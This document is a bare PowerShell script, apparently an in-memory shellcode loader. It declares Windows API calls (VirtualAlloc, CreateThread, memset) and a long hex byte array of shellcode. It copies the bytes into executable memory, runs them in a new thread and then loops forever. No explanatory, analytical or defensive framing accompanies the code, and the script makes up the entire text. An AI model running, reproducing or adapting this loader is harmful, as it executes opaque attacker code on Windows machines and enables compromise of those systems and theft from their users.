$k52 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $k52 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x1f,0xaa,0xc6,0x2b,0xd9,0xee,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x70,0x13,0x03,0x70,0x13,0x83,0xe8,0xe3,0x48,0x33,0xd7,0xf3,0x0f,0xbc,0x28,0x03,0x70,0x34,0xcd,0x32,0xb0,0x22,0x85,0x64,0x00,0x20,0xcb,0x88,0xeb,0x64,0xf8,0x1b,0x99,0xa0,0x0f,0xac,0x14,0x97,0x3e,0x2d,0x04,0xeb,0x21,0xad,0x57,0x38,0x82,0x8c,0x97,0x4d,0xc3,0xc9,0xca,0xbc,0x91,0x82,0x81,0x13,0x06,0xa7,0xdc,0xaf,0xad,0xfb,0xf1,0xb7,0x52,0x4b,0xf3,0x96,0xc4,0xc0,0xaa,0x38,0xe6,0x05,0xc7,0x70,0xf0,0x4a,0xe2,0xcb,0x8b,0xb8,0x98,0xcd,0x5d,0xf1,0x61,0x61,0xa0,0x3e,0x90,0x7b,0xe4,0xf8,0x4b,0x0e,0x1c,0xfb,0xf6,0x09,0xdb,0x86,0x2c,0x9f,0xf8,0x20,0xa6,0x07,0x25,0xd1,0x6b,0xd1,0xae,0xdd,0xc0,0x95,0xe9,0xc1,0xd7,0x7a,0x82,0xfd,0x5c,0x7d,0x45,0x74,0x26,0x5a,0x41,0xdd,0xfc,0xc3,0xd0,0xbb,0x53,0xfb,0x03,0x64,0x0b,0x59,0x4f,0x88,0x58,0xd0,0x12,0xc4,0xad,0xd9,0xac,0x14,0xba,0x6a,0xde,0x26,0x65,0xc1,0x48,0x0a,0xee,0xcf,0x8f,0x6d,0xc5,0xa8,0x00,0x90,0xe6,0xc8,0x09,0x56,0xb2,0x98,0x21,0x7f,0xbb,0x72,0xb2,0x80,0x6e,0xee,0xb7,0x16,0x51,0x47,0xb6,0xe1,0x39,0x9a,0xb9,0xfc,0xe5,0x13,0x5f,0xae,0x45,0x74,0xf0,0x0e,0x36,0x34,0xa0,0xe6,0x5c,0xbb,0x9f,0x16,0x5f,0x11,0x88,0xbc,0xb0,0xcc,0xe0,0x28,0x28,0x55,0x7a,0xc9,0xb5,0x43,0x06,0xc9,0x3e,0x60,0xf6,0x87,0xb6,0x0d,0xe4,0x7f,0x37,0x58,0x56,0x29,0x48,0x76,0xfd,0xd5,0xdc,0x7d,0x54,0x82,0x48,0x7c,0x81,0xe4,0xd6,0x7f,0xe4,0x7f,0xde,0x15,0x47,0x17,0x1f,0xfa,0x47,0xe7,0x49,0x90,0x47,0x8f,0x2d,0xc0,0x1b,0xaa,0x31,0xdd,0x0f,0x67,0xa4,0xde,0x79,0xd4,0x6f,0xb7,0x87,0x03,0x47,0x18,0x77,0x66,0x59,0x64,0xae,0x4e,0x2f,0x84,0x72;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$cuYl=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($cuYl.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$cuYl,0,0,0);for (;;){Start-sleep 60};